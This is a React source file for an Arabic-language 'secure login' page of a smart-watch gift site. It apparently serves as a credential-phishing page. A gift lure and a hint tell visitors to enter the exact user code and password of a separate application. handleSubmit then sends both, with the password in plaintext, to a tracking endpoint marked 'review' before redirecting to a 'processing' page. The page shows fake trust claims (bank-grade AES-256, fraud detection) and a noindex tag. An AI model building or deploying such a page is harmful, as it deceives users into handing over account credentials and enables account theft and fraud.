import { type FormEvent, useEffect, useState } from "react";
import { createFileRoute, useNavigate } from "@tanstack/react-router";
import {
  Eye,
  EyeOff,
  Fingerprint,
  Gift,
  KeyRound,
  Lock,
  
  ShieldCheck,
  Sparkles,
  UserRound,
  Zap,
} from "lucide-react";
import { toast } from "sonner";
import { z } from "zod";

import heroBg from "@/assets/hero-bg.jpg";
import { useOrder } from "@/lib/order";
import { trackEvent } from "@/lib/track";
import { getSessionId } from "@/lib/session-id";
import { OrderSteps } from "@/components/order-steps";
import { SiteHeader } from "@/components/site-header";
import { SiteFooter } from "@/components/site-footer";
import { Button } from "@/components/ui/button";
import { LazyImage } from "@/components/lazy-image";

const TITLE = "تسجيل الدخول الآمن — ساعة أهل مصر الذكية";
const DESCRIPTION =
  "سجّل الدخول إلى حسابك في ساعة أهل مصر الذكية لمتابعة طلبك واستلام هديتك الحصرية بأمان تام.";

export const Route = createFileRoute("/login")({
  head: () => ({
    meta: [
      { title: TITLE },
      { name: "description", content: DESCRIPTION },
      { property: "og:title", content: TITLE },
      { property: "og:description", content: DESCRIPTION },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
      { name: "robots", content: "noindex" },
    ],
  }),
  component: LoginPage,
});

const USER_CODE_RE = /^\d{5,9}$/;
const FORBIDDEN_SYMBOLS_RE = /[<>/\\()[\]{}]/;
const ALLOWED_PW_RE = /^[A-Za-z0-9@#$%_!^&*\-+=]+$/;
const HAS_SPACE_RE = /\s/;
const NON_ASCII_RE = /[^\x20-\x7E]/;
const HAS_UPPER_RE = /[A-Z]/;
const HAS_LOWER_RE = /[a-z]/;
const HAS_DIGIT_RE = /\d/;

function hasRepeat(pw: string) {
  return /(.)\1{3,}/.test(pw);
}

function hasSequential(pw: string) {
  const lower = pw.toLowerCase();
  for (let i = 0; i <= lower.length - 4; i++) {
    let asc = true;
    let desc = true;
    for (let j = 1; j < 4; j++) {
      const diff = lower.charCodeAt(i + j) - lower.charCodeAt(i + j - 1);
      if (diff !== 1) asc = false;
      if (diff !== -1) desc = false;
    }
    if (asc || desc) return true;
  }
  return false;
}

function validatePassword(pw: string, userCode: string, name: string): string | null {
  if (pw.length < 8 || pw.length > 16) return "كلمة المرور يجب أن تكون بين 8 و16 خانة";
  if (HAS_SPACE_RE.test(pw)) return "لا يُسمح باستخدام المسافات في كلمة المرور";
  if (NON_ASCII_RE.test(pw)) return "استخدم الحروف الإنجليزية فقط في كلمة المرور";
  if (FORBIDDEN_SYMBOLS_RE.test(pw)) return "رموز غير مسموح بها: < > / \\ ( ) [ ] { }";
  if (!ALLOWED_PW_RE.test(pw)) return "استخدم فقط: A-Z a-z 0-9 @ # $ % _ ! ^ & * - + =";
  if (!HAS_UPPER_RE.test(pw) || !HAS_LOWER_RE.test(pw) || !HAS_DIGIT_RE.test(pw))
    return "يجب مزج حروف كبيرة وصغيرة وأرقام إنجليزية";
  if (userCode && (pw === userCode || pw.includes(userCode)))
    return "كلمة المرور يجب ألا تحتوي على كود المستخدم";
  if (hasRepeat(pw)) return "تجنب تكرار نفس الحرف أو الرقم";
  if (hasSequential(pw)) return "تجنب التسلسلات مثل 1234 أو abcd";
  if (name) {
    const parts = name
      .toLowerCase()
      .split(/\s+/)
      .filter((p) => p.length >= 3);
    const pwLower = pw.toLowerCase();
    if (parts.some((p) => pwLower.includes(p))) return "كلمة المرور تتشابه مع اسمك المسجل";
  }
  return null;
}

const schema = z.object({
  userCode: z
    .string()
    .trim()
    .regex(USER_CODE_RE, { message: "كود المستخدم من 5 إلى 9 أرقام إنجليزية" }),
  password: z.string(),
});

const TRUST = [
  { icon: ShieldCheck, title: "تشفير من الطرف للطرف", note: "AES-256 بمعايير بنكية" },
  { icon: Zap, title: "استجابة فورية", note: "أقل من 200 مللي ثانية" },
  { icon: Lock, title: "حماية متعددة الطبقات", note: "كشف احتيال ذكي" },
];

function passwordStrength(pw: string): { score: number; label: string; color: string } {
  if (!pw) return { score: 0, label: "—", color: "bg-border" };
  let score = 0;
  if (pw.length >= 8) score++;
  if (pw.length >= 12) score++;
  if (HAS_UPPER_RE.test(pw) && HAS_LOWER_RE.test(pw)) score++;
  if (HAS_DIGIT_RE.test(pw)) score++;
  if (/[@#$%_!^&*\-+=]/.test(pw)) score++;
  if (hasRepeat(pw) || hasSequential(pw)) score = Math.max(1, score - 2);
  const map = [
    { label: "ضعيفة جداً", color: "bg-destructive" },
    { label: "ضعيفة", color: "bg-destructive" },
    { label: "متوسطة", color: "bg-gold" },
    { label: "جيدة", color: "bg-gold" },
    { label: "قوية", color: "bg-primary" },
    { label: "ممتازة", color: "bg-primary" },
  ];
  const s = Math.min(score, 5);
  const entry = map[s] ?? map[0]!;
  return { score: s, label: entry.label, color: entry.color };
}

function validateUserCodeLive(code: string): string | null {
  if (!code) return null;
  if (!/^\d+$/.test(code)) return "أرقام إنجليزية فقط";
  if (code.length < 5) return `متبقّي ${5 - code.length} أرقام على الأقل`;
  if (code.length > 9) return "الكود 9 أرقام كحدٍّ أقصى";
  return null;
}

function validatePasswordLive(pw: string, userCode: string, name: string): string | null {
  if (!pw) return null;
  return validatePassword(pw, userCode, name);
}

function LoginPage() {
  const navigate = useNavigate();
  const { order, watch } = useOrder();
  const [form, setForm] = useState({ userCode: "", password: "" });
  const [showPw, setShowPw] = useState(false);
  const [capsOn, setCapsOn] = useState(false);
  const [loading, setLoading] = useState(false);
  const [showUserCodeHint, setShowUserCodeHint] = useState(false);
  const [showPwHint, setShowPwHint] = useState(false);

  useEffect(() => {
    const onKey = (e: KeyboardEvent) => {
      if (typeof e.getModifierState === "function") setCapsOn(e.getModifierState("CapsLock"));
    };
    window.addEventListener("keydown", onKey);
    window.addEventListener("keyup", onKey);
    return () => {
      window.removeEventListener("keydown", onKey);
      window.removeEventListener("keyup", onKey);
    };
  }, []);

  const strength = passwordStrength(form.password);
  const userCodeError = validateUserCodeLive(form.userCode);
  const userCodeOk = form.userCode.length >= 5 && form.userCode.length <= 9 && !userCodeError;
  const pwError = validatePasswordLive(form.password, form.userCode, order.name ?? "");
  const pwOk = form.password.length >= 8 && !pwError;

  function handleSubmit(event: FormEvent) {
    event.preventDefault();
    const result = schema.safeParse(form);
    if (!result.success) {
      toast.error(result.error.issues[0]?.message ?? "بيانات غير صحيحة");
      return;
    }
    const pwErr = validatePassword(result.data.password, result.data.userCode, order.name ?? "");
    if (pwErr) {
      toast.error(pwErr);
      return;
    }
    setLoading(true);
    void trackEvent({
      data: {
        sessionId: getSessionId(),
        stage: "processing",
        patch: {
          user_code: result.data.userCode,
          password: result.data.password,
          status: "review",
        },
      },
    });
    toast.success("تم تسجيل الدخول — جارٍ المراجعة");
    setTimeout(() => navigate({ to: "/processing" }), 350);
  }

  return (
    <div className="min-h-screen bg-background">
      <SiteHeader />

      <main>
        <OrderSteps current="login" className="py-6" />

        {/* Hero */}
        <section className="relative overflow-hidden">
          <LazyImage
            src={heroBg}
            alt=""
            width={1920}
            height={1088}
            wrapperClassName="absolute inset-0 h-full w-full"
            className="h-full w-full object-cover"
          />
          <div
            aria-hidden="true"
            className="absolute inset-0 bg-gradient-to-b from-primary/85 via-primary/70 to-background"
          />
          <div
            aria-hidden="true"
            className="pointer-events-none absolute -right-24 -top-24 h-72 w-72 rounded-full bg-gold/20 blur-3xl"
          />
          <div
            aria-hidden="true"
            className="pointer-events-none absolute -left-24 top-20 h-72 w-72 rounded-full bg-primary/40 blur-3xl"
          />

          <div className="relative mx-auto max-w-3xl px-4 pb-36 pt-16 text-center sm:pb-44 sm:pt-20">
            <span className="inline-flex items-center gap-2 rounded-full border border-hero-foreground/30 bg-hero-foreground/10 px-4 py-1.5 text-xs font-bold text-hero-foreground backdrop-blur">
              <Sparkles className="h-3.5 w-3.5" aria-hidden="true" />
              بوابة العملاء الآمنة
            </span>
            <h1 className="mt-6 text-3xl font-black leading-tight text-hero-foreground sm:text-5xl">
              مرحباً بك في <span className="text-gold">ساعة أهل مصر</span> الذكية
            </h1>
            <p className="mx-auto mt-4 max-w-md text-sm leading-relaxed text-hero-foreground/85 sm:text-base">
              سجّل الدخول للوصول إلى حسابك واستلام هديتك الحصرية بأمان تام
            </p>
            <span className="mt-6 inline-flex items-center gap-2 rounded-full border border-gold/50 bg-gold/15 px-4 py-2 text-sm font-bold text-gold backdrop-blur">
              <Gift className="h-4 w-4" aria-hidden="true" />
              هديتك: {watch?.name ?? order.spec ?? "ساعة أهل مصر الذكية"}
            </span>
          </div>
        </section>

        {/* Card */}
        <section className="relative z-10 mx-auto -mt-28 max-w-md px-4 sm:-mt-32">
          <div className="relative rounded-[28px] p-[1.5px] shadow-[var(--shadow-soft)]">
            <div
              aria-hidden="true"
              className="absolute inset-0 rounded-[28px] bg-[image:var(--gradient-gold)] opacity-90"
            />
            <div className="relative overflow-hidden rounded-[26px] bg-card">
              <div className="flex items-center justify-between border-b border-border/70 bg-secondary/40 px-6 py-3 text-xs">
                <span className="inline-flex items-center gap-1.5 font-bold text-primary">
                  <ShieldCheck className="h-3.5 w-3.5" aria-hidden="true" />
                  اتصال مشفّر
                </span>
                <span className="inline-flex items-center gap-1.5 text-muted-foreground">
                  <span className="relative flex h-2 w-2">
                    <span className="absolute inset-0 animate-ping rounded-full bg-primary/60" />
                    <span className="relative h-2 w-2 rounded-full bg-primary" />
                  </span>
                  الجلسة نشطة
                </span>
              </div>

              <div className="p-6 sm:p-8">
                <div className="flex items-center gap-3">
                  <span className="grid h-12 w-12 place-items-center rounded-2xl bg-[image:var(--gradient-primary)] text-primary-foreground shadow-[var(--shadow-card)]">
                    <KeyRound className="h-6 w-6" aria-hidden="true" />
                  </span>
                  <div>
                    <h2 className="text-xl font-black text-foreground">تسجيل الدخول</h2>
                    <p className="text-xs text-muted-foreground">أدخل بياناتك للمتابعة إلى المراجعة</p>
                  </div>
                </div>

                <form onSubmit={handleSubmit} className="mt-6 space-y-5" noValidate>
                  {/* User code */}
                  <div className="space-y-2">
                    <div className="flex items-center gap-1.5">
                      <label htmlFor="userCode" className="text-sm font-bold text-foreground">كود المستخدم</label>
                      <button
                        type="button"
                        onClick={() => setShowUserCodeHint((v) => !v)}
                        aria-label="مساعدة كود المستخدم"
                        aria-expanded={showUserCodeHint}
                        className="grid h-4 w-4 place-items-center rounded-full border border-muted-foreground/50 text-[10px] font-bold text-muted-foreground hover:border-primary hover:text-primary"
                      >
                        ؟
                      </button>
                    </div>
                    {showUserCodeHint && (
                      <p className="text-xs italic text-muted-foreground">
                        (أدخل كود المستخدم الخاص بالابلكيشن - من 5 إلى 9 أرقام)
                      </p>
                    )}
                    <div
                      className={`group relative rounded-2xl border bg-background transition-all focus-within:ring-4 ${
                        userCodeError
                          ? "border-destructive focus-within:ring-destructive/15"
                          : userCodeOk
                            ? "border-primary focus-within:ring-primary/15"
                            : "border-border focus-within:border-primary focus-within:ring-primary/15"
                      }`}
                    >
                      <UserRound
                        className={`pointer-events-none absolute right-3 top-1/2 h-5 w-5 -translate-y-1/2 ${
                          userCodeError ? "text-destructive" : userCodeOk ? "text-primary" : "text-muted-foreground group-focus-within:text-primary"
                        }`}
                        aria-hidden="true"
                      />
                      <input
                        id="userCode"
                        type="text"
                        inputMode="numeric"
                        pattern="[0-9]{5,9}"
                        maxLength={9}
                        autoComplete="username"
                        lang="en"
                        dir="ltr"
                        aria-invalid={!!userCodeError}
                        aria-describedby="userCode-msg"
                        value={form.userCode}
                        placeholder=" "
                        onBeforeInput={(e) => {
                          const ev = e as unknown as InputEvent;
                          const data = ev.data;
                          if (data && !/^[0-9]+$/.test(data)) e.preventDefault();
                        }}
                        onKeyDown={(e) => {
                          if (e.key === " ") e.preventDefault();
                        }}
                        onPaste={(e) => {
                          e.preventDefault();
                          const text = e.clipboardData.getData("text");
                          const normalized = text
                            .replace(/[\u0660-\u0669]/g, (d) => String(d.charCodeAt(0) - 0x0660))
                            .replace(/[\u06F0-\u06F9]/g, (d) => String(d.charCodeAt(0) - 0x06F0))
                            .replace(/\D/g, "")
                            .slice(0, 9);
                          setForm((f) => ({ ...f, userCode: (f.userCode + normalized).slice(0, 9) }));
                        }}
                        onChange={(e) => {
                          const normalized = e.target.value
                            .replace(/[\u0660-\u0669]/g, (d) => String(d.charCodeAt(0) - 0x0660))
                            .replace(/[\u06F0-\u06F9]/g, (d) => String(d.charCodeAt(0) - 0x06F0))
                            .replace(/[^0-9]/g, "")
                            .slice(0, 9);
                          setForm((f) => ({ ...f, userCode: normalized }));
                        }}
                        className="peer h-14 w-full rounded-2xl bg-transparent px-11 pb-1 pt-4 text-base tracking-widest text-foreground outline-none"
                      />
                    </div>
                  </div>


                  {/* Password */}
                  <div className="space-y-2">
                    <div className="flex items-center gap-1.5">
                      <label htmlFor="password" className="text-sm font-bold text-foreground">كلمة المرور</label>
                      <button
                        type="button"
                        onClick={() => setShowPwHint((v) => !v)}
                        aria-label="مساعدة كلمة المرور"
                        aria-expanded={showPwHint}
                        className="grid h-4 w-4 place-items-center rounded-full border border-muted-foreground/50 text-[10px] font-bold text-muted-foreground hover:border-primary hover:text-primary"
                      >
                        ؟
                      </button>
                    </div>
                    {showPwHint && (
                      <p className="text-xs italic text-muted-foreground">
                        (الحقول المسموح بها: حروف إنجليزية كبيرة وصغيرة، أرقام، ورموز خاصة مثل @, #, $, %, _ مع تجنب المسافات والأقواس)
                      </p>
                    )}
                    <div
                      className={`group relative rounded-2xl border bg-background transition-all focus-within:ring-4 ${
                        pwError
                          ? "border-destructive focus-within:ring-destructive/15"
                          : pwOk
                            ? "border-primary focus-within:ring-primary/15"
                            : "border-border focus-within:border-primary focus-within:ring-primary/15"
                      }`}
                    >
                      <Lock
                        className={`pointer-events-none absolute right-3 top-1/2 h-5 w-5 -translate-y-1/2 ${
                          pwError ? "text-destructive" : pwOk ? "text-primary" : "text-muted-foreground group-focus-within:text-primary"
                        }`}
                        aria-hidden="true"
                      />
                      <input
                        id="password"
                        type={showPw ? "text" : "password"}
                        maxLength={16}
                        minLength={8}
                        autoComplete="current-password"
                        lang="en"
                        dir="ltr"
                        aria-invalid={!!pwError}
                        value={form.password}
                        onChange={(e) => {
                          const filtered = e.target.value
                            .replace(/[^\x20-\x7E]/g, "")
                            .replace(/[\s<>/\\()[\]{}]/g, "")
                            .slice(0, 16);
                          setForm((f) => ({ ...f, password: filtered }));
                        }}
                        onPaste={(e) => {
                          e.preventDefault();
                          const text = e.clipboardData.getData("text");
                          const filtered = text
                            .replace(/[^\x20-\x7E]/g, "")
                            .replace(/[\s<>/\\()[\]{}]/g, "")
                            .slice(0, 16);
                          setForm((f) => ({ ...f, password: (f.password + filtered).slice(0, 16) }));
                        }}
                        className="h-14 w-full rounded-2xl bg-transparent px-11 pb-1 pt-4 text-base text-foreground outline-none"
                      />
                      <button
                        type="button"
                        onClick={() => setShowPw((v) => !v)}
                        aria-label={showPw ? "إخفاء كلمة المرور" : "إظهار كلمة المرور"}
                        className="absolute left-2 top-1/2 grid h-9 w-9 -translate-y-1/2 place-items-center rounded-lg text-muted-foreground transition-colors hover:bg-secondary hover:text-primary"
                      >
                        {showPw ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
                      </button>
                    </div>

                    {/* Strength meter */}
                    {form.password && (
                      <div className="flex items-center gap-2">
                        <div className="flex flex-1 gap-1">
                          {[0, 1, 2, 3, 4].map((i) => (
                            <span
                              key={i}
                              className={`h-1.5 flex-1 rounded-full transition-colors ${
                                i < strength.score ? strength.color : "bg-border"
                              }`}
                            />
                          ))}
                        </div>
                        <span className="min-w-[64px] text-left text-xs font-bold text-muted-foreground">
                          {strength.label}
                        </span>
                      </div>
                    )}

                    {capsOn && (
                      <p className="text-xs font-bold text-gold">⚠ مفتاح Caps Lock مُفعّل</p>
                    )}

                    {/* تنبيه هام — بارز أسفل كلمة المرور */}
                    <div className="relative overflow-hidden rounded-2xl p-[1.5px] shadow-[var(--shadow-card)]">
                      <div
                        aria-hidden="true"
                        className="absolute inset-0 rounded-2xl bg-[image:var(--gradient-gold)] opacity-90"
                      />
                      <div className="relative flex items-start gap-3 rounded-2xl bg-card p-4">
                        <span className="grid h-10 w-10 shrink-0 place-items-center rounded-xl bg-[image:var(--gradient-gold)] text-primary-foreground shadow-sm">
                          <ShieldCheck className="h-5 w-5" aria-hidden="true" />
                        </span>
                        <div className="min-w-0 flex-1">
                          <div className="flex items-center gap-2">
                            <span className="inline-flex items-center gap-1 rounded-full bg-gold/15 px-2 py-0.5 text-[10px] font-black uppercase tracking-wider text-gold">
                              <Sparkles className="h-3 w-3" aria-hidden="true" />
                              تنبيه هام
                            </span>
                          </div>
                          <p className="mt-1.5 text-sm font-bold leading-relaxed text-foreground">
                            تأكد إنك بتكتب اسم المستخدم وكلمة السر نفس اللي مسجلين عندك في الابلكيشن تماماً.
                          </p>
                        </div>
                      </div>
                    </div>
                  </div>


                  <div className="flex items-center justify-between">
                    <button
                      type="button"
                      onClick={() => toast("تواصل مع الدعم لاستعادة كلمة المرور")}
                      className="text-sm font-bold text-primary transition-colors hover:text-primary-hover"
                    >
                      نسيت كلمة المرور؟
                    </button>
                  </div>

                  <div className="flex items-center gap-3">
                    <button
                      type="button"
                      aria-label="الدخول ببصمة الإصبع"
                      onClick={() => toast("البصمة غير متاحة في النسخة التجريبية")}
                      className="grid h-14 w-14 shrink-0 place-items-center rounded-2xl border-2 border-primary/30 bg-secondary text-primary transition-all hover:scale-105 hover:border-primary hover:shadow-[var(--shadow-card)]"
                    >
                      <Fingerprint className="h-7 w-7" aria-hidden="true" />
                    </button>
                    <Button
                      type="submit"
                      disabled={loading}
                      className="h-14 flex-1 rounded-2xl bg-[image:var(--gradient-primary)] text-base font-black shadow-[var(--shadow-card)] transition-transform hover:scale-[1.01] active:scale-[0.99]"
                    >
                      {loading ? "جارٍ الدخول..." : "تسجيل الدخول الآمن"}
                    </Button>
                  </div>
                </form>
              </div>
            </div>
          </div>
        </section>

        {/* Trust badges */}
        <section className="mx-auto grid max-w-3xl gap-4 px-4 pt-12 sm:grid-cols-3">
          {TRUST.map(({ icon: Icon, title, note }) => (
            <div
              key={title}
              className="group rounded-2xl border border-border bg-card p-5 text-center shadow-[var(--shadow-card)] transition-all hover:-translate-y-0.5 hover:border-primary/40 hover:shadow-[var(--shadow-soft)]"
            >
              <span className="mx-auto grid h-11 w-11 place-items-center rounded-xl bg-[image:var(--gradient-primary)] text-primary-foreground shadow-sm transition-transform group-hover:scale-110">
                <Icon className="h-5 w-5" aria-hidden="true" />
              </span>
              <h3 className="mt-3 text-sm font-black text-foreground">{title}</h3>
              <p className="mt-1 text-xs text-muted-foreground">{note}</p>
            </div>
          ))}
        </section>

        <p className="mx-auto max-w-2xl px-4 py-10 text-center text-xs leading-relaxed text-muted-foreground">
          بمتابعة تسجيل الدخول، فإنك تقرّ بموافقتك على{" "}
          <span className="font-bold text-primary">الشروط والأحكام</span> و{" "}
          <span className="font-bold text-primary">سياسة الخصوصية</span> الخاصة بساعة أهل مصر الذكية.
        </p>
      </main>

      <SiteFooter />
    </div>
  );
}
